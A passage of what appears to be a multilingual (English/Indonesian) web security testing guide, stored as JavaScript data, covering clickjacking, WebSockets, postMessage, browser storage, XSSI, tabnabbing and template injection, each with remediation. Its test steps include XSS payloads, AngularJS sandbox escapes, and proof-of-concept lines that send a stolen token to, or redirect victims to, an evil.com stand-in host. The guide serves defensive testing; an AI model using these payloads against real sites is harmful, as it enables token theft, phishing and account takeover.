          'Intercept the SWF and decompile with a Flash decompiler to find insecure `ExternalInterface.call` sinks.',
          'Check that no SWF is used as a redirector or cross-domain data proxy (`crossdomain.xml` policies).',
          'Test `crossdomain.xml`: `curl https://target.com/crossdomain.xml` — a permissive `allow-access-from domain="*"` policy is a finding.'
        ],
        t: [
          'Enumerasi konten plugin: grep source halaman untuk `.swf`, `application/x-shockwave-flash`, `.xap`, dan tag `object`/`embed`.',
          'Uji parameter SWF: injeksikan nilai `FlashVars` seperti `<img src=x onerror=alert(1)>` ke attribute src embed atau flashvars.',
          'Intersep SWF dan decompile dengan Flash decompiler untuk menemukan sink `ExternalInterface.call` yang tidak aman.',
          'Pastikan tidak ada SWF yang dipakai sebagai redirector atau proxy data lintas domain (kebijakan `crossdomain.xml`).',
          'Uji `crossdomain.xml`: `curl https://target.com/crossdomain.xml` — kebijakan `allow-access-from domain="*"` yang permissif adalah sebuah temuan.'
        ],
        b: [
          'Cacah konten plugin: telusuri sumber halaman untuk `.swf`, `application/x-shockwave-flash`, `.xap`, dan tag `object`/`embed`.',
          'Uji parameter SWF: suntikkan nilai `FlashVars` seperti `<img src=x onerror=alert(1)>` ke atribut src sematan atau flashvars.',
          'Sadap SWF dan bongkar dengan pembongkar Flash untuk menemukan titik muat `ExternalInterface.call` yang tidak aman.',
          'Pastikan tidak ada SWF yang dipakai sebagai pengalih atau proksi data lintas domain (kebijakan `crossdomain.xml`).',
          'Uji `crossdomain.xml`: `curl https://target.com/crossdomain.xml` — kebijakan `allow-access-from domain="*"` yang longgar merupakan temuan.'
        ],
        s: [
          'Cari di source halaman: `.swf`, `embed`, `object` — sisa-sisa konten plugin lama.',
          'Kalau ketemu, coba sisipin lewat FlashVars — parameter kayak gini sering nerima HTML mentah.',
          'File SWF bisa dibongkar pakai decompiler — cari fungsi `ExternalInterface.call` yang nerima input mentah.',
          'Cek `crossdomain.xml` di situs target — file kecil ini pernah ngatur siapa boleh akses lintas domain.',
          'Kalau isinya `allow-access-from domain="*"`, itu temuan — semua situs bisa baca data target dulu waktu Flash masih hidup.'
        ]
      },
      tools: ['curl', 'browser dev tools', 'JPEXS FFDec', 'grep'],
      remediation: {
        en: 'Remove all Flash/Silverlight content and delete permissive crossdomain.xml policies. Any remaining plugin content should be retired, not patched.',
        t: 'Hapus semua konten Flash/Silverlight dan hapus kebijakan crossdomain.xml yang permissif. Konten plugin yang tersisa seharusnya dihentikan, bukan dipatch.',
        b: 'Hapus seluruh konten Flash/Silverlight dan singkirkan kebijakan crossdomain.xml yang longgar. Konten plugin yang tersisa seharusnya dipensiunkan, bukan ditambal.',
        s: 'Buang semua Flash dan plugin tua — jangan ditambal, dihapus total. Kalau masih nemu file SWF di server, itu sendiri udah temuan kebersihan.'
      }
    },

    {
      name_en: 'Testing for Clickjacking',
      name_id: { t: 'Pengujian Clickjacking', b: 'Pengujian Pembajakan Klik', s: 'Klik yang Tertipu di Atas Halaman Asli' },
      summary: {
        en: 'Clickjacking overlays a trusted page in a transparent iframe so victim clicks land on attacker-chosen buttons. Missing X-Frame-Options or frame-ancestors CSP makes any state-changing page a candidate.',
        t: 'Clickjacking menumpangkan halaman tepercaya dalam iframe transparan sehingga klik korban jatuh ke tombol pilihan penyerang. Absennya X-Frame-Options atau CSP frame-ancestors menjadikan setiap halaman pengubah state kandidat.',
        b: 'Pembajakan klik menumpangkan halaman tepercaya dalam iframe tembus pandang sehingga klik korban jatuh pada tombol pilihan penyerang. Tidak adanya X-Frame-Options atau CSP frame-ancestors menjadikan setiap halaman pengubah keadaan sebagai kandidat.',
        s: 'Halaman target disembunyiin di balik lapisan transparan — korban mikir dia klik tombol biasa, tapi sebenarnya nge-klik tombol di situs target kayak "hapus akun" atau "setuju".'
      },
      howto: {
        en: [
          'Check response headers: `curl -I https://target.com/account` — look for `X-Frame-Options` and `Content-Security-Policy: frame-ancestors`.',
          'Build an iframe PoC: `<iframe src="https://target.com/delete-account" style="opacity:0.7"></iframe>` inside a page with an overlaid button.',
          'Test critical pages: settings, transfer funds, add admin, change email, grant OAuth consent.',
          'Verify the frame actually renders — drag-select inside it as a test (blocked pages show blank or error).',
          'For drag-and-drop or multi-click attacks, verify whether sensitive actions lack CSRF token checks that would still fire inside a frame.'
        ],
        t: [
          'Periksa response header: `curl -I https://target.com/account` — cari `X-Frame-Options` dan `Content-Security-Policy: frame-ancestors`.',
          'Bangun PoC iframe: `<iframe src="https://target.com/delete-account" style="opacity:0.7"></iframe>` di dalam halaman dengan tombol yang di-overlay.',
          'Uji halaman kritis: pengaturan, transfer dana, tambah admin, ubah email, persetujuan OAuth.',
          'Pastikan frame benar-benar dirender — uji dengan drag-select di dalamnya (halaman yang diblokir tampil kosong atau error).',
          'Untuk serangan drag-and-drop atau multi-klik, periksa apakah aksi sensitif tidak memiliki pemeriksaan CSRF token yang tetap terpicu dalam frame.'
        ],
        b: [
          'Periksa tajuk respons: `curl -I https://target.com/account` — cari `X-Frame-Options` dan `Content-Security-Policy: frame-ancestors`.',
          'Bangun PoC iframe: `<iframe src="https://target.com/delete-account" style="opacity:0.7"></iframe>` di dalam halaman dengan tombol yang ditumpangkan.',
          'Uji halaman kritis: pengaturan, transfer dana, tambah admin, ubah surel, persetujuan OAuth.',
          'Pastikan bingkai benar-benar dirender — uji dengan seret-pilih di dalamnya (halangan tampil kosong atau bergalat).',
          'Untuk serangan seret-tempat atau klik-berkali, periksa apakah tindakan sensitif tidak memiliki pemeriksaan token CSRF yang tetap terpicu dalam bingkai.'
        ],
        s: [
          'Cek header-nya: `curl -I https://target.com/account` — cari `X-Frame-Options` atau `frame-ancestors`. Nggak ada? Lanjut.',
          'Bikin halaman uji sederhana: `<iframe src="https://target.com/delete-account"></iframe>` — kalau halaman target nongol, berarti bisa dibingkai.',
          'Fokus ke halaman berbahaya: hapus akun, transfer dana, ganti email, tambah admin.',
          'Coba blok-tulis di dalam iframe — kalau teks ke-highlight, halaman beneran aktif di situ.',
          'Kalau aksinya nggak butuh klik kedua (kayak konfirmasi CSRF), serangannya makin gampang.'
        ]
      },
      tools: ['curl', 'browser', 'Burp Suite'],
      remediation: {
        en: 'Send X-Frame-Options: DENY (or SAMEORIGIN) plus a CSP frame-ancestors directive on every state-changing page. Defense in depth: both headers, and consider requiring an interaction confirmation for critical actions.',
        t: 'Kirim X-Frame-Options: DENY (atau SAMEORIGIN) plus directive CSP frame-ancestors pada setiap halaman pengubah state. Defense in depth: kedua header, dan pertimbangkan konfirmasi interaksi untuk aksi kritis.',
        b: 'Kirim X-Frame-Options: DENY (atau SAMEORIGIN) beserta directive CSP frame-ancestors pada setiap halaman pengubah keadaan. Pertahanan berlapis: kedua tajuk, dan pertimbangkan konfirmasi interaksi untuk tindakan kritis.',
        s: 'Pasang dua-duanya: `X-Frame-Options: DENY` dan `frame-ancestors` di CSP — di setiap halaman yang bisa ngubah sesuatu. Dua tameng lebih aman dari satu.'
      }
    },

    {
      name_en: 'Testing for WebSockets',
      name_id: { t: 'Pengujian WebSocket', b: 'Pengujian Protokol WebSocket', s: 'Uji Koneksi Dua Arah (WebSocket)' },
      summary: {
        en: 'WebSockets often skip the origin checks and token validation applied to HTTP APIs. Intercept the ws:// channel to test for missing authorization, client-trusted messages, and plaintext transport.',
        t: 'WebSocket sering melewatkan pemeriksaan origin dan validasi token yang diterapkan pada API HTTP. Intersep channel ws:// untuk menguji absennya otorisasi, pesan yang mempercayai client, dan transport plaintext.',
        b: 'WebSocket sering melewatkan pemeriksaan asal dan validasi token yang diterapkan pada API HTTP. Sadap kanal ws:// untuk menguji absennya otorisasi, pesan yang mempercayai klien, dan transportasi teks polos.',
        s: 'WebSocket itu jalur obrolan dua arah situs — dan sering lupa dikasih pemeriksaan keamanan kayak API biasa. Kita sadap obrolan itu terus lihat bisa ngapain aja.'
      },
      howto: {
        en: [
          'Intercept the WebSocket handshake in Burp (WebSockets history tab) and read the `Sec-WebSocket-Key` exchange.',
          'Test cross-origin connections: open a `new WebSocket("wss://target.com/socket")` from an external page and see if it connects.',
          'Replay captured frames with tampered values: change `userId`, `price`, or `action` fields in JSON messages.',
          'Test authorization: connect with a second account and replay user-1 frames — if user-1 data returns, authorization is missing.',
          'Check for `ws://` (plaintext) on HTTPS pages — a mixed-content finding in itself.'
        ],
        t: [
          'Intersep handshake WebSocket di Burp (tab WebSockets history) dan baca pertukaran `Sec-WebSocket-Key`.',
          'Uji koneksi lintas origin: buka `new WebSocket("wss://target.com/socket")` dari halaman eksternal dan lihat apakah tersambung.',
          'Replay frame yang ditangkap dengan nilai yang dimanipulasi: ubah field `userId`, `price`, atau `action` dalam pesan JSON.',
          'Uji otorisasi: sambungkan dengan akun kedua dan replay frame user-1 — bila data user-1 kembali, otorisasi absen.',
          'Periksa `ws://` (plaintext) pada halaman HTTPS — itu sendiri merupakan temuan mixed-content.'
        ],
        b: [
          'Sadap jabat tangan WebSocket di Burp (tab riwayat WebSockets) dan baca pertukaran `Sec-WebSocket-Key`.',
          'Uji koneksi lintas asal: buka `new WebSocket("wss://target.com/socket")` dari halaman eksternal dan lihat apakah tersambung.',
          'Putar ulang bingkai yang ditangkap dengan nilai yang diubah: ganti kolom `userId`, `price`, atau `action` dalam pesan JSON.',
          'Uji otorisasi: sambungkan dengan akun kedua dan putar ulang bingkai pengguna-1 — bila data pengguna-1 kembali, otorisasi absen.',
          'Periksa `ws://` (teks polos) pada halaman HTTPS — hal itu sendiri merupakan temuan konten campuran.'
        ],
        s: [
          'Di Burp ada tab khusus riwayat WebSocket — buka itu, semua obrolan wss:// kecatat.',
          'Coba sambung dari halaman luar: `new WebSocket("wss://target.com/socket")` — kalau nyambung tanpa dicek, kurang bagus.',
          'Ambil satu pesan, ubah isinya — ganti `userId` jadi nomor orang lain atau `price` jadi 1 — terus kirim lagi.',
          'Uji paling penting: login akun B, terus kirim pesan milik akun A — kalau datanya keluar, otorisasinya bolong.',
          'Cek juga: halaman HTTPS tapi koneksinya `ws://` (bukan `wss://`)? Itu udah temuan sendiri.'
        ]
      },
      tools: ['Burp Suite', 'browser dev tools', 'wscat', 'websocat'],
      remediation: {
        en: 'Validate the Origin header during the handshake, apply the same session and authorization checks as HTTP APIs to every frame, and always use wss:// over TLS.',
        t: 'Validasi header Origin selama handshake, terapkan pemeriksaan session dan otorisasi yang sama seperti API HTTP pada setiap frame, dan selalu gunakan wss:// di atas TLS.',
        b: 'Validasi tajuk Origin selama jabat tangan berlangsung, berlakukan pemeriksaan sesi dan otorisasi yang setara dengan API HTTP pada setiap bingkai, dan selalu pakai wss:// di atas TLS.',
        s: 'Cek asal koneksi waktu handshake, terus periksa izin di SETIAP pesan yang masuk — bukan cuma waktu nyambung. Dan wajib `wss://`, bukan `ws://` polos.'
      }
    },

    {
      name_en: 'Testing for Web Messaging',
      name_id: { t: 'Pengujian Web Messaging (postMessage)', b: 'Pengujian Pesan Web (postMessage)', s: 'Uji Pesan Antarframe (postMessage)' },
      summary: {
        en: 'postMessage lets frames and windows talk cross-origin. Weak message handlers — missing origin checks on the listener, or trusting event.data blindly — give attackers an API into the page.',
        t: 'postMessage memungkinkan frame dan window berkomunikasi lintas origin. Message handler yang lemah — tanpa pemeriksaan origin di listener, atau mempercayai event.data secara buta — memberi penyerang API ke dalam halaman.',
        b: 'postMessage memungkinkan bingkai dan jendela berkomunikasi lintas asal. Penangan pesan yang lemah — tanpa pemeriksaan asal pada pendengar, atau mempercayai event.data secara buta — memberi penyerang pintu API ke dalam halaman.',
        s: 'postMessage itu cara jendela dan iframe ngobrol antardomain. Kalau penerimanya nggak ngecek siapa pengirimnya, kita bisa masukin pesan dari domain mana aja.'
      },
      howto: {
        en: [
          'Find listeners: grep JS for `addEventListener("message"` and note whether the handler checks `event.origin`.',
          'Read the handler logic: what fields in `event.data` reach sinks like `innerHTML`, `eval`, `location`, or privileged function calls.',
          'Send hostile messages from a test page: `window.opener.postMessage({"cmd":"xss","<img src=x onerror=alert(1)>"},"*")`.',
          'Exploit wildcard senders too: `iframe.contentWindow.postMessage(payload, "*")` leaks data when the reply targets any origin.',
          'Check iframe targets: if the handler replies with sensitive data to an unvalidated origin, you can host the receiving iframe.'
        ],
        t: [
          'Temukan listener: grep JS untuk `addEventListener("message"` dan catat apakah handler memeriksa `event.origin`.',
          'Baca logika handler: field apa dalam `event.data` yang mencapai sink seperti `innerHTML`, `eval`, `location`, atau pemanggilan fungsi privileged.',
          'Kirim pesan musuh dari halaman uji: `window.opener.postMessage({"cmd":"xss","<img src=x onerror=alert(1)>"},"*")`.',
          'Eksploitasi juga sender wildcard: `iframe.contentWindow.postMessage(payload, "*")` membocorkan data saat reply menargetkan origin mana pun.',
          'Periksa target iframe: bila handler membalas dengan data sensitif ke origin yang tidak divalidasi, Anda dapat meng-host iframe penerimanya.'
        ],
        b: [
          'Temukan pendengar: telusuri JS untuk `addEventListener("message"` dan catat apakah penangan memeriksa `event.origin`.',
          'Baca logika penangan: kolom apa dalam `event.data` yang mencapai titik muat seperti `innerHTML`, `eval`, `location`, atau pemanggilan fungsi istimewa.',
          'Kirim pesan musuh dari halaman uji: `window.opener.postMessage({"cmd":"xss","<img src=x onerror=alert(1)>"},"*")`.',
          'Manfaatkan juga pengirim wildcard: `iframe.contentWindow.postMessage(payload, "*")` membocorkan data ketika balasan menargetkan asal mana pun.',
          'Periksa sasaran iframe: bila penangan membalas dengan data sensitif ke asal yang tidak divalidasi, Anda dapat meng-hosing iframe penerimanya.'
        ],
        s: [
          'Cari di kode: `addEventListener("message"` — lihat di dalamnya, ada nggak pengecekan `event.origin` (asal pengirim).',
          'Telusuri ke mana isi pesannya pergi — kalau nyerempet `innerHTML` atau `eval`, menarik.',
          'Dari halaman uji, kirim pesan jahat: `targetWindow.postMessage({"cmd":"..."}, "*")` — coba macam-macam perintah.',
          'Pengirim yang pakai `"*"` tujuan balasan juga bahaya — balasan bisa diterima domain siapa aja.',
          'Kalau handler ngirim data sensitif balik tanpa ngecek asal, kita tinggal siapin halaman penerima di domain sendiri.'
        ]
      },
      tools: ['browser dev tools', 'Burp Suite', 'grep'],
      remediation: {
        en: 'Always validate event.origin against an allowlist inside every message handler, specify an exact target origin on every postMessage call instead of "*", and never pass message data to dangerous sinks without validation.',
        t: 'Selalu validasi event.origin terhadap allowlist di dalam setiap message handler, tentukan origin target yang persis pada setiap pemanggilan postMessage alih-alih "*", dan jangan pernah meneruskan data pesan ke sink berbahaya tanpa validasi.',
        b: 'Selalu validasi event.origin terhadap daftar putih di dalam setiap penangan pesan, tetapkan asal sasaran yang persis pada tiap pemanggilan postMessage alih-alih "*", dan jangan pernah meneruskan data pesan ke titik muat berbahaya tanpa validasi.',
        s: 'Di penerima: cek `event.origin` dulu, cuma terima dari domain temen. Di pengirim: tulis alamat tujuannya lengkap, jangan `"*"`. Isi pesannya juga divalidasi kayak input biasa.'
      }
    },

    {
      name_en: 'Testing for Browser Storage',
      name_id: { t: 'Pengujian Browser Storage (localStorage & sessionStorage)', b: 'Pengujian Penyimpanan Peramban', s: 'Cek Isi Penyimpanan Browser' },
      summary: {
        en: 'localStorage and sessionStorage frequently hold tokens, PII, and flags readable by any XSS. Inventory what the app stores, then assess blast radius: one stored session token turns an XSS into full account takeover.',
        t: 'localStorage dan sessionStorage sering menyimpan token, PII, dan flag yang dapat dibaca oleh XSS mana pun. Inventarisasi apa yang disimpan aplikasi, lalu nilai blast radius-nya: satu session token tersimpan mengubah XSS menjadi account takeover penuh.',
        b: 'localStorage dan sessionStorage kerap menyimpan token, informasi pribadi, dan penanda yang dapat dibaca oleh XSS mana pun. Inventarisasi apa yang disimpan aplikasi, lalu nilaikan jangkauan dampaknya: satu token sesi tersimpan mengubah XSS menjadi pengambilalihan akun penuh.',
        s: 'Situs nyimpen macam-macam di browser kita — kayak token login atau data pribadi. Kalau ada XSS, semua itu bisa dibaca. Kita cek apa aja yang disimpen terus nilai seberapa bahaya kalau bocor.'
      },
      howto: {
        en: [
          'Open dev tools Application tab and inventory all keys in localStorage, sessionStorage, IndexedDB, and cookies for the origin.',
          'Map values to sensitivity: session tokens (`localStorage.token`), user IDs, emails, roles, and feature flags.',
          'Test readability from script: `JSON.stringify(localStorage)` in console — anything XSS can read, an attacker can exfiltrate.',
          'Check storage after logout: tokens left behind mean a stale-session risk on shared machines.',
          'PoC the chain: combine a reflected XSS with `fetch("https://evil.com/?t="+localStorage.token)` to demonstrate token theft.'
        ],
        t: [
          'Buka tab Application di dev tools dan inventarisasi semua key di localStorage, sessionStorage, IndexedDB, dan cookie untuk origin tersebut.',
          'Petakan nilai ke sensitivitas: session token (`localStorage.token`), user ID, email, role, dan feature flag.',
          'Uji keterbacaan dari script: `JSON.stringify(localStorage)` di console — apa pun yang bisa dibaca XSS, penyerang dapat mengeksfiltrasi.',
          'Periksa storage setelah logout: token yang tertinggal berarti risiko sesi basi di komputer bersama.',
          'Buat PoC rantai: gabungkan reflected XSS dengan `fetch("https://evil.com/?t="+localStorage.token)` untuk membuktikan pencurian token.'
        ],
        b: [
          'Buka tab Application pada perkakas pengembang dan inventarisasi semua kunci di localStorage, sessionStorage, IndexedDB, dan kuki untuk asal tersebut.',
          'Petakan nilai menurut sensitivitas: token sesi (`localStorage.token`), ID pengguna, surel, peran, dan penanda fitur.',
          'Uji keterbacaan dari skrip: `JSON.stringify(localStorage)` pada konsol — apa pun yang dapat dibaca XSS dapat dibocorkan penyerang.',
          'Periksa penyimpanan setelah keluar: token yang tertinggal berarti risiko sesi basi pada komputer bersama.',
          'Buat PoC rantai: gabungkan XSS pantulan dengan `fetch("https://evil.com/?t="+localStorage.token)` untuk membuktikan pencurian token.'
        ],
        s: [
          'F12 → tab Application (atau Storage) — lihat semua yang kesimpen: localStorage, sessionStorage, cookies, IndexedDB.',
          'Tandai yang sensitif: token login? email? role admin? Itu nilainya tinggi.',
          'Coba di Console: `JSON.stringify(localStorage)` — kalau keliatan semua isinya, XSS mana aja bisa nyuri.',
          'Logout, terus cek lagi — masih ada token nyangkut? Bahaya di komputer share-an.',
          'Kalau nemu XSS, sambungin: `fetch("https://evil.com/?t="+localStorage.token)` — itu bukti klop XSS + data tersimpan = akun jatuh.'
        ]
      },
      tools: ['browser dev tools', 'Burp Suite'],
      remediation: {
        en: 'Keep session tokens in HttpOnly cookies so script cannot read them, store only non-sensitive data in web storage, and clear all client-side state on logout.',
        t: 'Simpan session token di cookie HttpOnly agar script tidak dapat membacanya, simpan hanya data non-sensitif di web storage, dan bersihkan seluruh state sisi client saat logout.',
        b: 'Simpan token sesi pada kuki HttpOnly agar skrip tidak dapat membacanya, simpan hanya data non-sensitif pada penyimpanan web, dan bersihkan seluruh keadaan sisi klien saat keluar.',
        s: 'Token login harus disimpen di cookie HttpOnly — JavaScript nggak bisa baca itu. localStorage cuma buat data nggak penting, kayak tema gelap-terang. Waktu logout, bersihin semuanya.'
      }
    },

    {
      name_en: 'Testing for Cross Site Script Inclusion',
      name_id: { t: 'Pengujian Cross Site Script Inclusion (XSSI)', b: 'Pengujian Pemuatan Skrip Lintas Situs (XSSI)', s: 'Uji Skrip yang Diambil Lintassitus' },
      summary: {
        en: 'XSSI abuses script tags, which execute cross-origin responses regardless of CORS. If a sensitive endpoint returns JavaScript or JSON-with-callback, an attacker page can include it and steal its contents.',
        t: 'XSSI menyalahgunakan tag script, yang mengeksekusi respons lintas origin tanpa memedulikan CORS. Bila endpoint sensitif mengembalikan JavaScript atau JSON dengan callback, halaman penyerang dapat menyertakannya dan mencuri isinya.',
        b: 'XSSI memanfaatkan tag skrip, yang tetap mengeksekusi respons lintas asal tanpa menghiraukan kebijakan CORS. Apabila endpoint sensitif mengembalikan JavaScript atau JSON dengan panggilan balik, halaman penyerang dapat menyertakannya lalu mencuri isinya.',
        s: 'Tag script boleh ngambil file dari domain mana aja — CORS nggak ngatur. Situs yang nyimpen data sensitif di file JavaScript bisa dibaca situs lain lewat trik ini.'
      },
      howto: {
        en: [
          'Enumerate script-retrievable resources: JS config files, JSON endpoints, and API routes that respond without CORS restrictions: `curl https://target.com/api/me`.',
          'Test JSONP callbacks: `curl "https://target.com/api/users?callback=steal"` — if the response wraps data in `steal(...)`, an attacker page can read it.',
          'Include the resource in an attack page: `<script src="https://target.com/api/me"></script>` and capture errors/leaks in a global handler.',
          'Exploit JavaScript-reachable data: define `window.users = []` and let an endpoint push data into a predictable variable name.',
          'Chain with authenticated endpoints — session cookies ride along on the script include automatically.'
        ],
        t: [
          'Enumerasi resource yang dapat diambil sebagai script: file konfigurasi JS, endpoint JSON, dan route API yang merespons tanpa restriksi CORS: `curl https://target.com/api/me`.',
          'Uji callback JSONP: `curl "https://target.com/api/users?callback=steal"` — bila response membungkus data dalam `steal(...)`, halaman penyerang dapat membacanya.',
          'Sertakan resource dalam halaman serangan: `<script src="https://target.com/api/me"></script>` dan tangkap error/kebocoran di handler global.',
          'Eksploitasi data yang dapat dijangkau JavaScript: definisikan `window.users = []` dan biarkan endpoint mendorong data ke nama variabel yang dapat diprediksi.',
          'Rantai dengan endpoint terautentikasi — cookie session ikut terbawa otomatis pada penyertaan script.'
        ],
        b: [
          'Cacah sumber daya yang dapat diambil sebagai skrip: berkas konfigurasi JS, endpoint JSON, dan rute API yang merespons tanpa pembatasan CORS: `curl https://target.com/api/me`.',
          'Uji panggilan balik JSONP: `curl "https://target.com/api/users?callback=steal"` — bila respons membungkus data dalam `steal(...)`, halaman penyerang dapat membacanya.',
          'Sertakan sumber daya dalam halaman serangan: `<script src="https://target.com/api/me"></script>` dan tangkap galat/kebocoran pada penangan global.',
          'Manfaatkan data yang terjangkau JavaScript: definisikan `window.users = []` dan biarkan endpoint mendorong data ke nama peubah yang dapat diduga.',
          'Rantai dengan endpoint terautentikasi — kuki sesi ikut terbawa otomatis pada penyertaan skrip.'
        ],
        s: [
          'Cari endpoint yang balisannya JavaScript atau JSON — cek `curl https://target.com/api/me`.',
          'Coba tambahin `?callback=steal` di ujungnya — kalau data balisannya jadi dibungkus `steal(...)`, itu JSONP, langsung bisa dicuri.',
          'Di halaman serangan, sisipin: `<script src="https://target.com/api/me"></script>` — tag script nggak kena aturan CORS.',
          'Trik keren: siapin `window.users = []` di halaman kita — kalau endpoint nyimpen data di variabel itu, isinya nyangkut ke kita.',
          'Icing on the cake: cookie korban otomatis ikut waktu skrip dimuat — datanya data akun asli.'
        ]
      },
      tools: ['curl', 'browser dev tools', 'Burp Suite'],
      remediation: {
        en: 'Return sensitive data only with CORS headers restricting origins, never support JSONP callbacks on authenticated endpoints, and prefix JSON responses with a parse-blocking character sequence.',
        t: 'Kembalikan data sensitif hanya dengan header CORS yang membatasi origin, jangan pernah mendukung callback JSONP pada endpoint terautentikasi, dan awali respons JSON dengan urutan karakter penghalang parsing.',
        b: 'Data sensitif hanya boleh dikembalikan bersama tajuk CORS yang membatasi asal; jangan pernah mendukung panggilan balik JSONP pada endpoint terautentikasi, dan awali respons JSON dengan urutan karakter yang menghalangi penguraian.',
        s: 'Endpoint berisi data sensitif harus kirim header CORS yang ketat, dan jangan pernah dukung `?callback=` lagi. Tambahan murah: awali respons JSON dengan karakter yang bikin gagal diparse kalau dimuat sebagai script.'
      }
    },

    {
      name_en: 'Testing for Reverse Tabnabbing',
      name_id: { t: 'Pengujian Reverse Tabnabbing', b: 'Pengujian Pembajakan Tab Terbalik', s: 'Uji Halaman yang Membajak Tab Asalnya' },
      summary: {
        en: 'A page opened via target=_blank gets a reference to its opener. If that page can be attacker-controlled (external links, user profiles), it can rewrite the original tab to a phishing clone.',
        t: 'Halaman yang dibuka via target=_blank mendapatkan referensi ke opener-nya. Bila halaman itu dapat dikontrol penyerang (link eksternal, profil user), ia dapat menulis ulang tab asal menjadi klon phishing.',
        b: 'Halaman yang dibuka melalui target=_blank memperoleh rujukan ke pembukanya. Bila halaman tersebut dapat dikendalikan penyerang (tautan eksternal, profil pengguna), ia dapat menulis ulang tab asal menjadi tiruan pishing.',
        s: 'Kalau situs buka link luar pakai `target="_blank"` tanpa pengaman, halaman luar itu bisa nulis ulang tab yang ngebuka dia — korban balik ke "situs asli" yang ternyata palsu.'
      },
      howto: {
        en: [
          'Enumerate links with target=_blank: grep source for `target="_blank"` and note which ones point to external or user-controlled URLs.',
          'Check for rel protections: a safe link reads `target="_blank" rel="noopener noreferrer"`.',
          'PoC: host a page containing `window.opener.location = "https://evil.com/login"` and get the target site to open it in a new tab.',
          'Test user-content areas: profile homepages, comment links, and ad slots that can carry your URL are prime candidates.',
          'Verify the original tab actually navigates — the user sees the trusted site silently swap to attacker content.'
        ],
        t: [
          'Enumerasi link dengan target=_blank: grep source untuk `target="_blank"` dan catat mana yang mengarah ke URL eksternal atau terkontrol user.',
          'Periksa proteksi rel: link yang aman tertulis `target="_blank" rel="noopener noreferrer"`.',
          'PoC: host halaman berisi `window.opener.location = "https://evil.com/login"` dan buat situs target membukanya di tab baru.',
          'Uji area konten user: homepage profil, link komentar, dan slot iklan yang dapat membawa URL Anda adalah kandidat utama.',
          'Pastikan tab asal benar-benar bernavigasi — user melihat situs tepercaya berganti senyap menjadi konten penyerang.'
        ],
        b: [
          'Cacah tautan dengan target=_blank: telusuri sumber untuk `target="_blank"` dan catat mana yang mengarah ke URL eksternal atau terkendali pengguna.',
          'Periksa perlindungan rel: tautan yang aman tertulis `target="_blank" rel="noopener noreferrer"`.',
          'PoC: hosing halaman berisi `window.opener.location = "https://evil.com/login"` dan buat situs sasaran membukanya pada tab baru.',
          'Uji area konten pengguna: laman profil, tautan komentar, dan slot iklan yang dapat membawa URL Anda adalah kandidat utama.',
          'Pastikan tab asal benar-benar berpindah — pengguna melihat situs tepercaya berganti senyap menjadi konten penyerang.'
        ],
        s: [
          'Cari semua `target="_blank"` di halaman — cek apakah ada `rel="noopener"` di sebelahnya.',
          'Link aman bentuknya: `target="_blank" rel="noopener noreferrer"`. Nggak ada noopener? Lanjut uji.',
          'Bikin halaman jahat berisi `window.opener.location = "https://evil.com"` — yang penting ini halaman yang bisa kita arahkan dari situs target.',
          'Tempat terbaik: link profil user, komentar, atau slot iklan — kita bisa naruh URL kita sendiri di situ.',
          'Hasilnya: tab yang ngebuka link berubah senyap jadi halaman phishing — korban nggak sadar pindah rumah.'
        ]
      },
      tools: ['browser dev tools', 'grep', 'browser'],
      remediation: {
        en: 'Add rel="noopener noreferrer" to every link and window.open call, or use the COOP header (Cross-Origin-Opener-Policy: same-origin) for page-wide protection.',
        t: 'Tambahkan rel="noopener noreferrer" pada setiap link dan pemanggilan window.open, atau gunakan header COOP (Cross-Origin-Opener-Policy: same-origin) untuk proteksi seluruh halaman.',
        b: 'Setiap tautan dan pemanggilan window.open sebaiknya diberi rel="noopener noreferrer"; sebagai alternatif, gunakan tajuk COOP (Cross-Origin-Opener-Policy: same-origin) agar perlindungan berlaku untuk seluruh halaman.',
        s: 'Gampang bener dibenerinnya: tambahin `rel="noopener noreferrer"` di semua link `target="_blank"`. Buat tameng menyeluruh, pasang header `Cross-Origin-Opener-Policy: same-origin`.'
      }
    },

    {
      name_en: 'Testing for Client-side Template Injection',
      name_id: { t: 'Pengujian Client-side Template Injection (CSTI)', b: 'Pengujian Penyuntikan Templat di Sisi Klien', s: 'Uji Template Engine di Browser' },
      summary: {
        en: 'Client-side frameworks (AngularJS, Vue, client-side Handlebars) evaluate expressions in templates. If user input lands inside a template before compilation, expressions like 7*7 execute — and can escalate to XSS or full sandbox escape.',
        t: 'Framework client-side (AngularJS, Vue, Handlebars sisi client) mengevaluasi ekspresi dalam template. Bila input user mendarat di dalam template sebelum kompilasi, ekspresi seperti 7*7 tereksekusi — dan dapat dieskalasi ke XSS atau sandbox escape penuh.',
        b: 'Kerangka kerja sisi klien (AngularJS, Vue, Handlebars sisi klien) mengevaluasi ekspresi dalam templat. Bila masukan pengguna mendarat di dalam templat sebelum kompilasi, ekspresi seperti 7*7 tereksekusi — dan dapat ditingkatkan menjadi XSS atau lolosan sandbox penuh.',
        s: 'Framework kayak Angular punya bahasa ekspresi sendiri di dalam template-nya. Kalau input kita masuk ke situ sebelum diproses, kita bisa jalanin ekspresi — dan kadang sampai nge-bypass sandbox-nya.'
      },
      howto: {
        en: [
          'Inject the arithmetic probe into every input: `{{7*7}}` — if the page renders `49` instead of the literal string, template injection exists.',
          'Identify the engine: `{{7*7}}` (Angular/Vue), `${7*7}` (JS template literals), `{{constructor.constructor("alert(1)")()}}` (AngularJS sandbox probe).',
          'For AngularJS, attempt sandbox escape: `{{constructor.constructor("alert(1)")()}}` — many old versions allow full JS execution.',
          'Test client-side template contexts: search boxes rendering results, personalized greetings, and single-page-app state rendered from URL parameters.',
          'Confirm XSS impact by combining a working expression with DOM access, and note the framework version for CVE matching.'
        ],
        t: [
          'Injeksikan probe aritmetika ke setiap input: `{{7*7}}` — bila halaman merender `49` alih-alih string literal, template injection ada.',
          'Identifikasi engine-nya: `{{7*7}}` (Angular/Vue), `${7*7}` (template literal JS), `{{constructor.constructor("alert(1)")()}}` (probe sandbox AngularJS).',
          'Untuk AngularJS, coba sandbox escape: `{{constructor.constructor("alert(1)")()}}` — banyak versi lama mengizinkan eksekusi JS penuh.',
          'Uji konteks template sisi client: kotak pencarian yang merender hasil, sapaan personal, dan state SPA yang dirender dari parameter URL.',
          'Konfirmasi dampak XSS dengan menggabungkan ekspresi yang berfungsi dengan akses DOM, dan catat versi framework untuk pencocokan CVE.'
        ],
        b: [
          'Suntikkan probe aritmetika ke setiap masukan: `{{7*7}}` — bila halaman merender `49` alih-alih untai harfiah, penyuntikan templat ada.',
          'Identifikasi mesinnya: `{{7*7}}` (Angular/Vue), `${7*7}` (untai templat JS), `{{constructor.constructor("alert(1)")()}}` (probe sandbox AngularJS).',
